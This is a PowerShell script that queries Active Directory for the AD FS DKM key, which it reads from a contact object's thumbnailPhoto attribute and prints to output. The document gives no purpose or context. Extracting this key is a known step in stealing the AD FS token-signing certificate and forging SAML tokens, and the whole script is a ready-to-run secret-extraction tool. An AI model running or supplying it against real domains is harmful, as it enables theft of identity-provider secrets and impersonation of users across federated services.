function Get-DKMKey {
    Import-Module ActiveDirectory
    
    # Function to get the DKM Key
    # Make sure to fill your DC FQDN in <DC FQDN>
    function Get-DKMKey {
        param (
            [string]$domain = (Get-ADDomain -Server <DC FQDN>).DNSRoot,
            [string]$server = (Get-ADDomainController).Name
        )
    
        
        $domainComponents = $domain -split '\.'
        $dcString = ($domainComponents | ForEach-Object { "DC=$_" }) -join ','
    
        $searchBase = "CN=ADFS,CN=Microsoft,CN=Program Data,$dcString"
    
      
        try {
            $key = (Get-ADObject -Filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' -SearchBase $searchBase -Properties thumbnailPhoto).thumbnailPhoto
            if ($key) {
                $keyString = [System.BitConverter]::ToString($key)
                Write-Output "DKM Key: $keyString"
                 Write-Output "Domain is: $domain"
            } else {
                Write-Output "DKM Key not found."
            }
        } catch {
            Write-Output "Error: $_"
        }
    }
    
    # Example usage
    Get-DKMKey
}
